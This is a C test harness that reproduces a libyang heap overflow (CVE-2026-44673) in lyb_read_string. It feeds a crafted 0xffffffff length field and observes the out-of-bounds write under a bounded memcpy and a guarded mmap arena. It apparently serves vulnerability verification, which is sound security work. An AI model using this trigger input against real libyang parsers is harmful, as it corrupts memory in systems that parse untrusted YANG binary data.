/* Direct-call harness for libyang CVE-2026-44673 / GHSA-vw2p-pq79-92xh.
 *
 * The write path (lyb_read, lyb_read_size, lyb_read_string, ly_in_read) is
 * copied verbatim from the pinned sources by gen_fn.py. Only the environment
 * is supplied here: sizes, logs, the input, and a BOUNDED memcpy sink.
 *
 * The real ly_in_read() calls memcpy(buf, in->current, count) where count is
 * 536870911 bytes for str_len=0xffffffff. instrumented_memcpy records that
 * exact requested count but copies at most 16 scripted bytes, so the fault is
 * reachable without manufacturing half a gigabyte of attacker input. The
 * out-of-bounds destination write itself is real and is seen by ASan.
 */
#define _GNU_SOURCE
#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

typedef int LY_ERR;
enum { LY_SUCCESS = 0, LY_EMEM = -1, LY_EINVAL = -2, LY_EDENIED = -3 };

#define LYPLG_BITS2BYTES(b) ((uint64_t)(b) / 8 + (((uint64_t)(b) % 8) ? 1 : 0))
#define LY_CHECK_ERR_RET(cond, action, rc) do { if (cond) { action; return (rc); } } while (0)
#define LY_CHECK_ARG_RET(ctx, a, b, rc) do { if (!(a) || !(b)) { printf("ARG_ERROR\n"); return (rc); } } while (0)
#define LOGMEM(ctx) printf("LOGMEM\n")
#define LOGERR(ctx, rc, msg) printf("LOGERR %s\n", msg)
#define LOGINT(ctx) printf("LOGINT\n")
#define assert(x) do { if (!(x)) { printf("ASSERT_FAIL\n"); abort(); } } while (0)

struct ly_in {
    const uint8_t *start;
    const uint8_t *current;
    size_t length;
    unsigned peeked;
    uint8_t peek;
};

struct lylyb_parse_ctx {
    struct ly_in *in;
    unsigned shrink;
    unsigned buf_bits;
    uint64_t buf;
    void *ctx;
};

static uint8_t lyb_right_bit_mask(uint8_t n) { return (uint8_t)((1u << n) - 1); }
static void lyb_prepend_bits(void *buf, size_t n, uint64_t b, uint8_t bits)
{ (void)buf; (void)n; (void)b; (void)bits; printf("PREPEND\n"); }
static void ly_in_skip(struct ly_in *in, size_t n) { in->current += n; }

static uint64_t g_req_bytes, g_copied_bytes;

static void *instrumented_memcpy(void *dst, const void *src, size_t n)
{
    size_t copy = n < 16 ? n : 16, i;
    g_req_bytes = (uint64_t)n;
    for (i = 0; i < copy; ++i) {
        ((uint8_t *)dst)[i] = ((const uint8_t *)src)[i];
    }
    g_copied_bytes = (uint64_t)copy;
    printf("SINK_REQ=%llu SINK_COPY=%llu\n",
            (unsigned long long)g_req_bytes, (unsigned long long)g_copied_bytes);
    return dst;
}
#define memcpy instrumented_memcpy

#if defined(ALLOC_MODE_ASAN)
static void *logging_malloc(size_t n)
{
    printf("MALLOC_REQ=%zu\n", n);
    return malloc(n);
}
#define malloc logging_malloc
#elif defined(ALLOC_MODE_PLAIN)
static uint8_t *g_arena;

/* 4 GiB + two pages of PROT_NONE address space; only the touched pages are
 * made writable. This lets the plain build observe the UINT32_MAX terminator
 * write without allocating 4 GiB of RAM. */
static void *arena_malloc(size_t n)
{
    const size_t span = 0x100000000ULL + 0x2000;
    printf("MALLOC_REQ=%zu\n", n);
    if (!g_arena) {
        g_arena = mmap(NULL, span, PROT_NONE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
        if (g_arena == MAP_FAILED) { perror("mmap"); exit(2); }
        if (mprotect(g_arena, 0x2000, PROT_READ | PROT_WRITE) ||
            mprotect(g_arena + 0xfffff000ULL, 0x2000, PROT_READ | PROT_WRITE)) {
            perror("mprotect"); exit(2);
        }
    }
    return g_arena;
}
#define malloc arena_malloc
#else
#error define ALLOC_MODE_ASAN or ALLOC_MODE_PLAIN
#endif

#define LIBYANG_API_DEF
static void lyb_read(void *, uint64_t, struct lylyb_parse_ctx *);
static void lyb_read_size(uint32_t *, struct lylyb_parse_ctx *);
static LY_ERR lyb_read_string(char **, struct lylyb_parse_ctx *);
LY_ERR ly_in_read(struct ly_in *, void *, size_t);

#include PIN_FILE

int main(int argc, char **argv)
{
    uint32_t len = 0xffffffffu;
    unsigned base = 0x41;
    uint8_t input[4 + 16];
    struct ly_in in;
    struct lylyb_parse_ctx ctx;
    char *str = NULL;
    LY_ERR rc;
    unsigned i;
    setvbuf(stdout, NULL, _IONBF, 0);

    if (argc > 1) { len = (uint32_t)strtoul(argv[1], NULL, 16); }
    if (argc > 2) { base = (unsigned)strtoul(argv[2], NULL, 16); }
    for (i = 0; i < 4; ++i) { input[i] = (uint8_t)(len >> (8 * i)); }
    for (i = 0; i < 16; ++i) { input[4 + i] = (uint8_t)(base + i); }

    in.start = input;
    in.current = input;
    in.length = 0;             /* ly_in_new_memory(): no length bound */
    in.peeked = 0;
    in.peek = 0;
    ctx.in = &in;
    ctx.shrink = 0;            /* non-shrink: four-byte LE size */
    ctx.buf_bits = 0;
    ctx.buf = 0;
    ctx.ctx = NULL;

    printf("INPUT_LEN=%08x BASE=%02x\n", len, base);
    rc = lyb_read_string(&str, &ctx);
    printf("RC=%d\n", rc);
    printf("PTR_NULL=%d\n", str == NULL);

#if defined(ALLOC_MODE_PLAIN)
    if (str) {
        printf("PTR_OFFSET=%llu\n", (unsigned long long)((uint8_t *)str - g_arena));
        printf("BUF16=");
        for (i = 0; i < 16; ++i) { printf("%02x", (unsigned char)str[i]); }
        printf("\nTERM_OFFSET=%llu TERM_BYTE=%02x\n",
                (unsigned long long)len, (unsigned char)str[len]);
    }
#endif
#if defined(ALLOC_MODE_ASAN)
    free(str);
#endif
    return 0;
}
